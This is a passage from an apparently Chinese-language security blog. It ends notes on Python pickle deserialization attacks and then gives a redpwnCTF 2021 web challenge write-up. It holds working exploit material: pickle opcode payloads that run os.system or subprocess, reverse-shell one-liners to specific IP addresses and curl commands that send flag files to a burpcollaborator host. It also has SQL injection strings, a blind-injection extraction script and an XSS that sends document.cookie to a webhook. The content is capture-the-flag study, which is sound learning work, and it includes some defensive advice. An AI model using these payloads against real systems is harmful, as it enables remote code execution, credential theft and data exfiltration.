secret.category)为真，即correct==True\n这里我们通过加载__main__.secret可以引入secret模块，来把secret.name和secret.category这两个变量覆盖为任意字符串，再以这个字符串为参数构造Animal对象（栈顶对于type的检查）\npker\nsecret = GLOBAL(\u0026#39;__main__\u0026#39;, \u0026#39;secret\u0026#39;) secret.name = \u0026#39;frieggs\u0026#39; secret.category = \u0026#39;frieggs\u0026#39; animal = INST(\u0026#39;__main__\u0026#39;, \u0026#39;Animal\u0026#39;, \u0026#39;frieggs\u0026#39;, \u0026#39;frieggs\u0026#39;) return animal # b\u0026#34;c__main__\\nsecret\\np0\\n0g0\\n(}(S\u0026#39;name\u0026#39;\\nS\u0026#39;frieggs\u0026#39;\\ndtbg0\\n(}(S\u0026#39;category\u0026#39;\\nS\u0026#39;frieggs\u0026#39;\\ndtb(S\u0026#39;frieggs\u0026#39;\\nS\u0026#39;frieggs\u0026#39;\\ni__main__\\nAnimal\\np3\\n0g3\\n.\u0026#34; 或者构造的exp.py\nimport pickle class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return f\u0026#39;Animal(name={self.name!r}, category={self.category!r})\u0026#39; def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.category print(pickle.dumps(Animal(name=\u0026#34;x\u0026#34;, category=\u0026#34;y\u0026#34;), protocol=3)) # b\u0026#39;\\x80\\x03c__main__\\nAnimal\\nq\\x00)\\x81q\\x01}q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03X\\x01\\x00\\x00\\x00xq\\x04X\\x08\\x00\\x00\\x00categoryq\\x05X\\x01\\x00\\x00\\x00yq\\x06ub.\u0026#39; ————所以在不允许b'R'的情况下，思路则是篡改secret中的name和categoriy，单纯的用b'c'引入模块对Animal进行实例化，这一过程也相当于是执行了函数\n 一种解决办法就是这个栗子中的，干脆就不rce，而是用b'c'变量覆盖，思路就是上个三级标题下面的那个大段，不再赘述。\n\u0026ndash;\u0026raquo;使用__setstate__\u0026amp;b'b'实现rce 另一种方式是用BUILD指令b'b'及进行rce。\n在pickle源码中BUILD指令是这样的\n如果一个实例inst拥有__setstate__方法，则把state交给__setstate__方法来处理；否则直接把state这个dist的内容合并到inst.__dict__ 内。\n如果一个类原本没有__setstate__这个方法，当我们用{'__setstate__': os.system}来BUILD这个对象，那么现在对象的__setstate__就变成了os.system；接下来利用\u0026quot;ls /\u0026quot;来再次BUILD这个对象，则会执行setstate(\u0026quot;ls /\u0026quot;) ，而此时__setstate__已经被我们设置为os.system，因此实现了rce\nimport pickle import os class Student(): def __init__(self): self.name = \u0026#39;amelia\u0026#39; self.grade = \u0026#39;A1\u0026#39; payload = b\u0026#39;\\x80\\x03c__main__\\nStudent\\n)\\x81}(V__setstate__\\ncos\\nsystem\\nubVls /\\nb.\u0026#39; # shell = b\u0026#34;\u0026#34;\u0026#34;\\x80\\x03c__main__\\nStudent\\n)\\x81}(V__setstate__\\ncos\\nsystem\\nubS\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.31.29/8426 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39;\\nb.\u0026#34;\u0026#34;\u0026#34; pickle.loads(payload) 可以看到成功做到了rce~~反弹shell当然也可以\n\u0026ndash;\u0026raquo;使用_instantiate()\u0026amp;load_obj()\u0026amp;load_inst()\u0026amp;b'o'\u0026amp;b'i'实现rce   _instantiate(): Create a new object via klass(*args); Leads to arbitrary function call actually\n  def _instantiate(self, klass, args): if (args or not isinstance(klass, type) or hasattr(klass, \u0026#34;__getinitargs__\u0026#34;)): try: # Arbitrary function all value = klass(*args) except TypeError as err: raise TypeError(\u0026#34;in constructor for %s: %s\u0026#34; % (klass.__name__, str(err)), sys.exc_info()[2]) else: value = klass.__new__(klass) self.append(value)     load_obj()\n  def load_obj(self): # Stack is ... markobject classobject arg1 arg2 ... args = self.pop_mark() cls = args.pop(0) self._instantiate(cls, args) dispatch[OBJ[0]] = load_obj     load_inst()\n  def load_inst(self): # read from user input module = self.readline()[:-1].decode(\u0026#34;ascii\u0026#34;) name = self.readline()[:-1].decode(\u0026#34;ascii\u0026#34;) klass = self.find_class(module, name) # get args from stack args = self.pop_mark() self._instantiate(klass, args) dispatch[INST[0]] = load_inst     exp.py\nimport pickle import struct import base64 def exploit(command): assert type(command) is list payload_prefix = b\u0026#39;\u0026#39;\u0026#39;((\u0026#39;\u0026#39;\u0026#39; payload_suffix = b\u0026#39;\u0026#39;\u0026#39;lisubprocess\\nPopen\\n.\u0026#39;\u0026#39;\u0026#39; payload_body = bytes() for c in command: payload_body += b\u0026#34;X\u0026#34; + bytes(struct.pack(\u0026#34;\u0026lt;I\u0026#34;, len(c))) + bytes(c, encoding=\u0026#34;utf-8\u0026#34;) payload = payload_prefix + payload_body + payload_suffix assert b\u0026#39;R\u0026#39; not in payload return payload def main(): payload = exploit([ \u0026#34;python\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;print(\u0026#39;pwned!\u0026#39;)\u0026#34; ]) print(\u0026#34;Payload:\u0026#34;, payload) print(\u0026#34;Length:\u0026#34;, len(payload)) print(\u0026#34;Base64:\u0026#34;, base64.b64encode(payload)) x = pickle.loads(payload) print(x) if __name__ == \u0026#34;__main__\u0026#34;: main() # 反弹shell当然也可 都说了是rce了 import sys,socket,os,pty s=socket.socket() s.connect((\u0026#34;182.92.191.192\u0026#34;,50000)) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(\u0026#34;/bin/sh\u0026#34;) payload = exploit([ \u0026#34;python\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#39;import sys,socket,os,pty;s=socket.socket();s.connect((\u0026#34;8.8.8.8\u0026#34;, 13337));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39;, ]) \u0026ndash;\u0026raquo;使用_getattribute()\u0026amp;load_obj()\u0026amp;load_inst()实现任意文件读取   find_class()\n  def find_class(self, module, name): # Subclasses may override this. sys.audit(\u0026#39;pickle.find_class\u0026#39;, module, name) if self.proto \u0026lt; 3 and self.fix_imports: if (module, name) in _compat_pickle.NAME_MAPPING: module, name = _compat_pickle.NAME_MAPPING[(module, name)] elif module in _compat_pickle.IMPORT_MAPPING: module = _compat_pickle.IMPORT_MAPPING[module] __import__(module, level=0) if self.proto \u0026gt;= 4: return _getattribute(sys.modules[module], name)[0] else: return getattr(sys.modules[module], name)     _getattribute()\n  def _getattribute(obj, name): for subpath in name.split(\u0026#39;.\u0026#39;): if subpath == \u0026#39;\u0026lt;locals\u0026gt;\u0026#39;: raise AttributeError(\u0026#34;Can\u0026#39;t get local attribute {!r}on {!r}\u0026#34; .format(name, obj)) try: parent = obj obj = getattr(obj, subpath) except AttributeError: raise AttributeError(\u0026#34;Can\u0026#39;t get attribute {!r}on {!r}\u0026#34; .format(name, obj)) from None return obj, parent     read()\n  def read(filename, encoding=\u0026#39;utf-8\u0026#39;): with open(filename, \u0026#39;r\u0026#39;, encoding=encoding) as fin: return fin.read()     仍然以上面webtmp(究极缝合怪)的题为例，我们可以利用上面的函数，创建一个Animal的实例，然后将name或category的值设置为read wrapper的返回值\nexp.py\nimport pickle import struct import base64 def read(filename, encoding=\u0026#39;utf-8\u0026#39;): with open(filename, \u0026#39;r\u0026#39;, encoding=encoding) as fin: return fin.read() def exploit(filename): payload_prefix = b\u0026#39;\u0026#39;\u0026#39;(\u0026#39;\u0026#39;\u0026#39; payload_body = b\u0026#34;X\u0026#34; + bytes(struct.pack(\u0026#34;\u0026lt;I\u0026#34;, len(filename))) + bytes(filename, encoding=\u0026#34;utf-8\u0026#34;) payload_suffix = b\u0026#39;\u0026#39;\u0026#39;i__main__\\nread\\n.\u0026#39;\u0026#39;\u0026#39; payload = payload_prefix + payload_body + payload_suffix assert b\u0026#39;R\u0026#39; not in payload return payload def main(): payload = exploit(\u0026#34;flag\u0026#34;) print(\u0026#34;Payload:\u0026#34;, payload) # b\u0026#39;(X\\x04\\x00\\x00\\x00flagi__main__\\nread\\n.\u0026#39; print(\u0026#34;Length:\u0026#34;, len(payload)) print(\u0026#34;Base64:\u0026#34;, base64.b64encode(payload)) if __name__ == \u0026#34;__main__\u0026#34;: main() 再把这一部分的payload缝合到创建Animal实例的Opcode中去\n# 原: name=\u0026#39;x\u0026#39;,category=\u0026#39;y\u0026#39; b\u0026#39;\\x80\\x03c__main__\\nAnimal\\nq\\x00)\\x81q\\x01}q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03X\\x01\\x00\\x00\\x00xq\\x04X\\x08\\x00\\x00\\x00categoryq\\x05X\\x01\\x00\\x00\\x00yq\\x06ub.\u0026#39; # 缝合 应该能看出来改在哪里了 b\u0026#39;\\x80\\x03c__main__\\nAnimal\\nq\\x00)\\x81q\\x01}q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03(X\\x04\\x00\\x00\\x00flagi__main__\\nread\\nq\\x04X\\x08\\x00\\x00\\x00categoryq\\x05X\\x01\\x00\\x00\\x00yq\\x06ub.\u0026#39; 一些小技巧\u0026amp;注意事项  当把payload作为get参数请求时，url编码注意换行符是%0A而不是%0D%0A 对payload进行b64加密时，注意别把\\n给单独编码了（不过正常都不会） 其他模块的load也可以触发pickle反序列化漏洞  例如：numpy.load()先尝试以numpy自己的数据格式导入，如果失败，则尝试以pickle的格式导入；pandas.read_pickle()直接使用pickle.load()方法\n 灵活运用burp collaborator  虽然我们不能把burp提供的collaborator当作vps来使用，进行反弹shell然后一通操作，但是我们可以利用反引号+curl的方式直接获得代码执行和结果的输出；curl本身的用法也很多，可以直接带文件进行post，更多内容参见：curl 的用法指南\n# 基操1 os.system(\u0026#39;curl http://xxxx.burpcollaborator.net/`ls / | base64`) # 基操2 -d参数可以读取本地文件内容作为数据体发送，会自动添加请求头并调整请求方法 无需-X POST os.system(\u0026#39;curl -d \u0026#39;@/flag.txt\u0026#39; http://xxxx.burpcollaborator.net/) 最后，出于安全角度的考量   禁用pickle，使用Json或Google Protocol Buffers\n  当确实需要使用pickle时，要确保对用户的输入进行过滤，比如重写find_class()（使用白名单而不是黑名单进行过滤）、禁止某些操作符；由于在对opcode进行反序列化时可能会造成任意文件读写，一定提前对重要文件做好权限的管理；必要时可以对信息进行hmac签名\n  举一个hmac的栗子\nimport hmac import pickle import base64 class Student: def __init__(self, name, age): self.name = name self.age = age def __str__(self): return \u0026#34;My name is %s, I am %dyears old.\u0026#34; % ( self.name, self.age ) class HMAC_Pickler: def __init__(self, secret_key, seperator=\u0026#34;|\u0026#34;): self.secret_key = secret_key self.seperator = seperator def digital_signature(self, data): signer = hmac.new(self.secret_key) signer.update(data) return signer.hexdigest() def loads(self, data): sign = data[:32] p = data[32+len(self.seperator):] assert sign == self.digital_signature(p), (\u0026#34;Data is tampered by someone.\u0026#34;) return pickle.loads(p) def dumps(self, obj): p = pickle.dumps(obj) sign = self.digital_signature(p) return \u0026#34;%s%s%s\u0026#34; % (sign, self.seperator, p) def main(): SECRET_KEY = b\u0026#39;7f54a0ab-6443-457c-ba20-2510ebbfb28f\u0026#39; pickler = HMAC_Pickler(SECRET_KEY) obj = Student(\u0026#34;Jack\u0026#34;, 19) print(obj) p = pickler.dumps(obj) print(p) o = pickler.loads(p) print(o) p += \u0026#34;I am hacker, trying evil things\u0026#34; x = pickler.loads(p) print(x) if __name__ == \u0026#34;__main__\u0026#34;: main()     栗子7 - [BalsnCTF 2019] Pyshv3   这次的find_class()没有变化，但是structs有具体的实现\n同时server.py的逻辑也发生了变化，不用rce了，直接有一个拿flag的函数，但需要self.user.privileged为True才可以返回\n而这个self.user.privileged在一开始就被设为了False\nemmmm 这怎么绕过捏？\n先说非预期，将__builtins__复制到modules属性上；再说说预期解。\n我们知道，有__get__，__set__这样描述器协议方法的对象称为描述器descriptor。默认对属性的访问控制都是从对象的字典__dict__里面进行获取(get)，设置(set)和删除(delete)的方法（前面的那道题也用到这个点）。举例来说，a.x的查找顺序是a.__dict__['x']，之后type(a).__dict__['x']，然后找type(a)的父类。如果查找到的值是一个描述器，python就会调用描述器的方法来重写默认的控制行为，这个重写发生在这个查找环节的哪里取决于定义了哪个描述器方法。（注意：只有在新式类中时描述器才起作用）（更多介绍参见：什么是描述符（descriptor））\n我们利用描述器的特性，将User类的__set__方法重载为structs.User，并把它的privileged属性赋值为一个User实例。当进行self.user.privileged被赋值时触发__set__，但由于已经被重写，所以并不会被赋值False，而是保持原样，还是一个User实例。在后面if判断时，User实例当然是True，就可以绕过了。\npker\nUser = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;User\u0026#39;) User.__set__ = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;User\u0026#39;) user = User(0, 0) User.privileged = user return user opcode\nb\u0026quot;cstructs\\nUser\\np0\\n0g0\\n(}(S'__set__'\\ncstructs\\nUser\\ndtbg0\\n(I0\\nI0\\ntRp2\\n0g0\\n(}(S'privileged'\\ng2\\ndtbg2\\n.\u0026quot;  考虑到这个题更综合了python的相关特性，所以把这个题放在最后。\n 从新建文件到写完用了几天时间，细细地整理相关知识，也算是对反序列化这个知识点的认识清晰了不少。还有一个PyYAML的反序列化问题，由于篇幅问题拆开来放到下一篇中。自认为总结的还是比较详细的（嘿嘿x）不过肯定还有不周到的地方，之后如遇到更多知识还会进行补充。\n自己还是有惰性啊，其实反序列化第一篇总结的是php，可是到现在还有几个二级标题下面是空白的……只能先给自己找个借口：php反序列化的东西实在是太多了TAT\n 最后放一下全篇用到的的参考文章（部分已写在对应标题下面），不分先后~\nPython 反序列化漏洞学习笔记 | 一篇文章带你理解漏洞之 Python 反序列化漏洞 | pickle反序列化初探 | Python pickle 反序列化实例分析 | Python 反序列化安全问题（一） - Python 反序列化安全问题（二） | 从零开始python反序列化攻击：pickle原理解析 \u0026amp; 不用reduce的RCE姿势 | 关于Python sec的一些简单的总结 | Sour Pickles A serialised exploitation guide in one part - Macro Slaviero | 🐍 Security Issues in Python Pickle\n","date":"2021-08-12T11:48:05+08:00","permalink":"https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/","section":"posts","tags":["python"],"title":"反序列化专题笔记·壹·python篇"},{"categories":["CTF"],"contents":"官方的docker地址~~复现一本满足~https://github.com/redpwn/redpwnctf-2021-challenges\nweb/inspect-me  See if you can find the flag in the source code!\ninspect-me.mc.ax\n web/orm-bad  I just learned about orms today! They seem kinda difficult to implement though\u0026hellip; Guess I\u0026rsquo;ll stick to good old raw sql statements!\norm-bad.mc.ax\nDownloads - app.js\n 万能密码：admin\u0026rsquo;or'1 : admin\n关于orm 之后要补一下知识：Object–relational mapping ORM 实例教程\nweb/secure  Just learned about encryption—now, my website is unhackable!\nsecure.mc.ax\nDownloads - index.js\n 还是个登录框，尝试万能密码\n源码是这样的\nconst crypto = require(\u0026#39;crypto\u0026#39;); const express = require(\u0026#39;express\u0026#39;); const db = require(\u0026#39;better-sqlite3\u0026#39;)(\u0026#39;db.sqlite3\u0026#39;); db.exec(`DROP TABLE IF EXISTS users;`); db.exec(`CREATE TABLE users( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT );`); db.exec(`INSERT INTO users (username, password) VALUES ( \u0026#39;${btoa(\u0026#39;admin\u0026#39;)}\u0026#39;, \u0026#39;${btoa(crypto.randomUUID)}\u0026#39; )`); const app = express(); app.use( require(\u0026#39;body-parser\u0026#39;).urlencoded({ extended: false, }) ); app.post(\u0026#39;/login\u0026#39;, (req, res) =\u0026gt; { if (!req.body.username || !req.body.password) return res.redirect(\u0026#39;/?message=Username and password required!\u0026#39;); const query = `SELECT id FROM users WHERE username = \u0026#39;${req.body.username}\u0026#39; AND password = \u0026#39;${req.body.password}\u0026#39;;`; try { const id = db.prepare(query).get()?.id; if (id) return res.redirect(`/?message=${process.env.FLAG}`); else throw new Error(\u0026#39;Incorrect login\u0026#39;); } catch { return res.redirect( `/?message=Incorrect username or password. Query: ${query}` ); } }); 他这个b64加密是发生在前端的，也就是在发包的时候就已经对post的数据进行了预处理，而具体到后端进行sql语句的查询时会直接拼接req.body.username/passwd的数据，不会进行进一步的检查或过滤\n刚开始想复杂了\nweb/cool  Aaron has a message for the cool kids. For support, DM BrownieInMotion.\ncool.mc.ax\nDownloads - app.py\n 登录框，可以注册 先尝试test: test 登录成功但是无法获取信息（注册后也会跳转这个页面\n留意cookie部分，是熟悉的flask session，扔进工具里解密\n再参考源码中的/message部分，考虑将session设为{\u0026ldquo;username\u0026rdquo;:\u0026ldquo;ginkoid\u0026rdquo;}后登入查看信息（开始以为是session伪造 后来发现不是）\n看一下其他部分的源码，首先是init()\ndef init(): # this is terrible but who cares execute(\u0026#39;\u0026#39;\u0026#39; CREATE TABLE IF NOT EXISTS users ( username TEXT PRIMARY KEY, password TEXT ); \u0026#39;\u0026#39;\u0026#39;) execute(\u0026#39;DROP TABLE users;\u0026#39;) execute(\u0026#39;\u0026#39;\u0026#39; CREATE TABLE users ( username TEXT PRIMARY KEY, password TEXT ); \u0026#39;\u0026#39;\u0026#39;) # put ginkoid into db ginkoid_password = generate_token() execute( \u0026#39;INSERT OR IGNORE INTO users (username, password)\u0026#39; f\u0026#39;VALUES (\\\u0026#39;ginkoid\\\u0026#39;, \\\u0026#39;{ginkoid_password}\\\u0026#39;);\u0026#39; ) execute( f\u0026#39;UPDATE users SET password=\\\u0026#39;{ginkoid_password}\\\u0026#39;\u0026#39; f\u0026#39;WHERE username=\\\u0026#39;ginkoid\\\u0026#39;;\u0026#39; ) 然后是在创建用户create_user()和登录check_login()时都会检测用户名中是否有非法字符（白名单是26个英文字母大小写和数字），算是挺严格的\ndef create_user(username, password): if any(c not in allowed_characters for c in username): return (False, \u0026#39;Alphanumeric usernames only, please.\u0026#39;) if len(username) \u0026lt; 1: return (False, \u0026#39;Username is too short.\u0026#39;) if len(password) \u0026gt; 50: return (False, \u0026#39;Password is too long.\u0026#39;) other_users = execute( f\u0026#39;SELECT * FROM users WHERE username=\\\u0026#39;{username}\\\u0026#39;;\u0026#39; ) if len(other_users) \u0026gt; 0: return (False, \u0026#39;Username taken.\u0026#39;) execute( \u0026#39;INSERT INTO users (username, password)\u0026#39; f\u0026#39;VALUES (\\\u0026#39;{username}\\\u0026#39;, \\\u0026#39;{password}\\\u0026#39;);\u0026#39; # passwd部分可控 ) return (True, \u0026#39;\u0026#39;) 考虑了一下二次注入，因为注册时的passwd部分完全可控，设想是这样的\n构造passwd部分为 '),('ginkoid','passwd\nemmmm 但是这里不管是明文还是url encode都会有500错误，而且这里返回的时correct_password[0][0]==password，也算是杜绝了这种多添加一条信息的可能，之前已经初始化的密码会是[0][0]，而新插入的passwd将是[1][0]；并且在init()时定义username是primary 也不可能有重复的\n————比赛的时候就停到这里了，也是当时了解的太少，思路很容易就断掉了。。。以下是复现\n在看了这篇wp之后，发现这位师傅最开始跟我的思路是一样的 都想利用insert那一句，都想替换掉数据库中原来存有的ginkoid的密码；这位师傅用的payload是\n'),('ginkoid','') ON CONFLICT DO UPDATE SET password='';-- 其中的ON CONFLICT DO UPDATE SET，在这篇官方文档里写的很详细，这位师傅给的payload很好（我当时则对这个sql语句并不清楚）但是正如他所说的，which is 8 characters over the limit, which won\u0026rsquo;t do.\n最后使用盲注的方式，先上一下脚本 （这里是来源）再说说思路\nimport time import requests url = \u0026#34;https://cool.mc.ax/\u0026#34; # url = \u0026#34;http://127.0.0.1:5000/\u0026#34; prefix = \u0026#34;asdfjwfoijweoijfojiewfj\u0026#34; charset = \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789\u0026#34; val = \u0026#34;\u0026#34; for i in range(32): username = prefix + str(time.time_ns()).replace(\u0026#34;0\u0026#34;, \u0026#34;\u0026#34;)\t# 注意白名单里没有0 要换掉 password = f\u0026#34;\u0026#39;||(select substr(password,{i+1},1) from users)||\u0026#39;\u0026#34; resp = requests.post(url + \u0026#34;register\u0026#34;, data={\u0026#34;username\u0026#34;: username, \u0026#34;password\u0026#34;: password}).text for c in charset: resp = requests.post(url, data={\u0026#34;username\u0026#34;: username, \u0026#34;password\u0026#34;: c}).text if \u0026#34;Incorrect\u0026#34; not in resp: print(c) val += c break print(val) 注入点仍然是上文提到的/register路由中create_user(username,password)（当时找对了注入点，但是盲注这块还是做的少）\n主要的payload是\npassword = f\u0026#34;\u0026#39;||(select substr(password,{i+1},1) from users)||\u0026#39;\u0026#34; 这一句，当进入到注册流程时 会执行\nexcute(\u0026#39;INSERT INTO users (username, password)\u0026#39; f\u0026#39;VALUES (\\\u0026#39;{username}\\\u0026#39;, \\\u0026#39;{password}\\\u0026#39;);\u0026#39;) 即\nexcute(\u0026#39;INSERT INTO users(username, password)\u0026#39; values (\u0026#39;xxxxusernamexxxx\u0026#39;, \u0026#39;\u0026#39;||(select substr(password,n,1) from users)||\u0026#39;\u0026#39;)) 其中||连接两个不同的字符串，得到一个新的字符串；所以发送注册请求时password的值就是后面的查询语句select substr(password,n,1) from users，而查询语句返回的是substr(password,n,1) 是ginkoid这个账户的密码的其中一位，要获得这个值具体是什么 需要再有一个for in _ in charset遍历，在登录处 把这个值给试出来\n英文版讲解：The SELECT statement will take the character at index in ginkoid\u0026rsquo;s password, and concatenate it with \u0026lsquo;\u0026rsquo;, to be used as the new user\u0026rsquo;s password. We can then try logging in as our new user with every character in allowed_characters as the password. If we login successfully, then we know that we guessed the character correctly. Repeating this for all 32 characters gives us our password.\n获得密码后以ginkoid的账号登录，会得到一个mp3文件，但是并不是什么所谓的隐写 flag就在抓包后可以看到\n————其实还是有一点点疑问，为什么select substr(password,n,1) from users就能确保是ginoid的passwd呢？ginkoid是表中的第一条数据，在新建表后立刻插入，这就可以保证在查询的时候只查ginkoid的密码吗？\ndiscord之前有人问过这个问题，当时的解答是这是sqllite的特性，但是用sqllite在线工具尝试后发现也不是这样的 也会返回所有数据的substr(x,x,x)的值，但是确实是用这样的payload能做出来\n————后来想了一下 是这里的return correct_password[0][0]==password 确保了虽然sql查询语句返回的是很多个单一字母，但是是多行返回，仍然只会取到第一个；再加上username是主键 第一个插入，所以这个payload是可以的以一个事后诸葛亮的角度来看return correct_password[0][0]==password 这句代码 其实有暗示的成分在了\n————还有另一版的脚本 discord里收的import asyncio import random import aiohttp allowed = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789\u0026#39; url = \u0026#39;\u0026lt;https://cool.mc.ax/\u0026gt;\u0026#39; n = 32 final = dict() async def try_pass(sem, username, password, index): params = { \u0026#39;username\u0026#39;: username, \u0026#39;password\u0026#39;: password, } async with sem: async with aiohttp.ClientSession() as session: async with session.post(url, data=params) as resp: result = await resp.text() if \u0026#39;Incorrect\u0026#39; not in result: print(f\u0026#39;password[{index}]: {password}\u0026#39;) final[index] = password async def get_char(sem, index): # random username since otherwise we error username = \u0026#39;\u0026#39;.join(random.choices(allowed, k=32)) payload = f\u0026#34;\u0026#39;||(SELECT substr(password,{index+1},1) FROM users)||\u0026#39;\u0026#34; assert(len(payload) \u0026lt;= 50) params = { \u0026#39;username\u0026#39;: username, \u0026#39;password\u0026#39;: payload, } async with sem: async with aiohttp.ClientSession() as session: await session.post(url + \u0026#39;register\u0026#39;, data=params) tasks = [] for c in allowed: tasks.append(try_pass(sem, username, c, index)) await asyncio.gather(*tasks) async def main(): # without this we get an OSError due to too many open file descriptors sem = asyncio.Semaphore(300) index_tasks = [] for i in range(n): index_tasks.append(get_char(sem, i)) await asyncio.gather(*index_tasks) password = \u0026#39;\u0026#39; for i in range(len(final)): password += final[i] print(f\u0026#34;Password: {password}\u0026#34;) asyncio.run(main()) web/notes  Texting things to yourself, but online! notes.mc.ax\nPlease put a reasonably secure password when making an account\nReport problems here.\nDownloads - notes.tar.gz\n 先看页面 是个登录框，先填用户名和密码再点login或register，尝试test: test登入，界面是一个可以加notes 自定body和tag的app在view notes看到已经有人试过xss了，这里有个小小的越权漏洞，/view/+username直接可以看到其他的师傅在尝试什么样的payload（看了wp以后才意识到这里的tag部分就是注入点 而当时的我以为是卡bug了简单审了下源码，也没啥特别的，首先初始化一个admin号，flag在admin的private分类的notes中；对于个人发的notes会转义body部分为html实体来预防xss\n但是这个notes-app的形式是妥妥的xss了，那突破口在哪里捏？其实是被忽略的tag部分！一般情况下看到tag可选private/public就会不关注这里，但是配合特殊的DOM解析 这里无疑是注入点！下面简单分析一下，参考wp\n从/static/view.html中我们可以看到这个notes-app的前端渲染所凭借的模板长啥样\nbody部分被完全的保护了，但是tag没有过滤 只是限制了个数\n我们利用的就是浏览器解析html的部分，可以让不相关的几个notes拼接在一起（举个简单的栗子：在一个note里面用\u0026lt;p\u0026gt; 另一个里面放\u0026lt;/p\u0026gt;，中间的部分会被放在一起）这里选用的是\u0026lt;style\u0026gt;这个tag，利用它onload的属性\n还有一个待解决的问题是上下两个notes之间会有\u0026lt;div class=\u0026quot;card\u0026quot;\u0026gt;的存在；这也是不用\u0026lt;iframe\u0026gt;和它的onload属性的原因，因为浏览器是不允许\u0026lt;iframe\u0026gt;中属性换行的\n我们最终的payload\nbody: anything tag: \u0026lt;style a=' body: anything tag: 'onload='` body: `;eval(somecode)/* tag: */'\u0026gt; 然后是常规的xss\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; window.open(\u0026#34;https://notes.mc.ax/view/\u0026lt;username\u0026gt;\u0026#34;, \u0026#34;navigator.sendBeacon(\u0026#39;\u0026lt;webhook server\u0026gt;\u0026#39;, document.cookie)\u0026#34;); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; web/Requester  Java is the future. Strictly typed, extremeley secure, and the most modern frameworks all come together to make an unhackable service. - Nobody 2021\nrequester.mc.ax\nDownloads - requester-release.zip\n java可以说是完全不懂，比赛的时候就简单看了下就溜了，参考 解法1 - _replicator 解法2 - _find\n一个简单的java-app，检测给出的api是否正常 并且返回一个json\n给了docker\n先用jd-gui打开jar包看看源码\n先看Main.class\npublic class Main { public static Database db; public static String flag; public static void main(String[] args) { String adminUser = System.getenv(\u0026#34;adminUser\u0026#34;); String adminPassword = System.getenv(\u0026#34;adminPassword\u0026#34;); flag = System.getenv(\u0026#34;flag\u0026#34;); String javalinEnv = System.getenv(\u0026#34;javalinEnv\u0026#34;); db = new Database(adminUser, adminPassword); db.initializeDatabase(); JavalinJte.configure(createTemplateEngine(javalinEnv)); Javalin app = Javalin.create().start(8080); app.get(\u0026#34;/\u0026#34;, ctx -\u0026gt; ctx.render(\u0026#34;index.jte\u0026#34;)); app.get(\u0026#34;/createUser\u0026#34;, Handlers::createUser); app.get(\u0026#34;/testAPI\u0026#34;, Handlers::testAPI); } } 做一些初始化的工作，取出admin的用户名和密码以及flag的值，新建一个database，分出3个路由；\n先看database.class（分析的比较详细 之前做java很少\nprivate final String adminUsername; private final String adminPassword; public Database(String adminUsername, String adminPassword) { this.adminUsername = adminUsername; this.adminPassword = adminPassword; } private String getDbString() { return \u0026#34;http://\u0026#34; + this.adminUsername + \u0026#34;:\u0026#34; + this.adminPassword + \u0026#34;@couchdb:5984/\u0026#34;; } private boolean validateAlphanumeric(String name) { return name.matches(\u0026#34;^[a-zA-Z0-9_]*$\u0026#34;); } 存储从main.class里接收到的adminUsername\u0026amp;adminPassword；getDbString()返回一个可以用来连接couchdb数据库的url\npublic void createDatabase(String name) throws Exception { if (name.length() \u0026gt; 16 || !validateAlphanumeric(name)) throw new Exception(\u0026#34;Illegal name\u0026#34;); JSONObject res = HttpClient.putAPI(getDbString() + getDbString(), \u0026#34;\u0026#34;); if (!res.has(\u0026#34;ok\u0026#34;) || !res.getBoolean(\u0026#34;ok\u0026#34;)) throw new Exception(\u0026#34;Database creation failed\u0026#34;); } public void initializeDatabase() { try { createDatabase(\u0026#34;_replicator\u0026#34;); } catch (Exception e) { Utils.logException(e); System.out.println(\u0026#34;Replicator already initialized\u0026#34;); } try { createDatabase(\u0026#34;_users\u0026#34;); } catch (Exception e) { Utils.logException(e); System.out.println(\u0026#34;Users already initialized\u0026#34;); } try { createDatabase(\u0026#34;log\u0026#34;); } catch (Exception e) { Utils.logException(e); System.out.println(\u0026#34;Log already initialized\u0026#34;); } } 通过向构造好的url发送http请求来创建数据库，有三个默认的库：_replicator, _users, log\npublic void createUser(String name, String password) throws Exception { if (name.length() \u0026gt; 16 || !validateAlphanumeric(name)) throw new Exception(\u0026#34;Illegal name\u0026#34;); if (password.length() \u0026gt; 16 || !validateAlphanumeric(password)) throw new Exception(\u0026#34;Illegal password\u0026#34;); // ... boring java stuff  JSONObject res = HttpClient.putAPI(getDbString() + \u0026#34;_users/org.couchdb.user:\u0026#34; + getDbString(), userObj.toString()); // ... boring java stuff  } public void addUserToDatabase(String dbName, String username) throws Exception { if (dbName.length() \u0026gt; 16 || !validateAlphanumeric(dbName)) throw new Exception(\u0026#34;Illegal dbname\u0026#34;); if (username.length() \u0026gt; 16 || !validateAlphanumeric(username)) throw new Exception(\u0026#34;Illegal username\u0026#34;); // ... boring java stuff  JSONObject res = HttpClient.putAPI(getDbString() + getDbString() + \u0026#34;/_security\u0026#34;, configObj.toString()); // ... boring java stuff  } public void insertDocumentToDatabase(String dbName, String document) throws Exception { // ... boring java stuff  JSONObject res = HttpClient.postAPI(getDbString() + getDbString(), document); // ... boring java stuff  } 这部分是创建用户并插入数据库中 并且插入一个文件，欸 用的也是http发请求这一招 这不就可控了？\n这里就完了，转去看Handlers.class\npublic static void createUser(Context ctx) { String username = (String)ctx.queryParam(\u0026#34;username\u0026#34;, String.class).get(); String password = (String)ctx.queryParam(\u0026#34;password\u0026#34;, String.class).get(); try { Main.db.createDatabase(username); 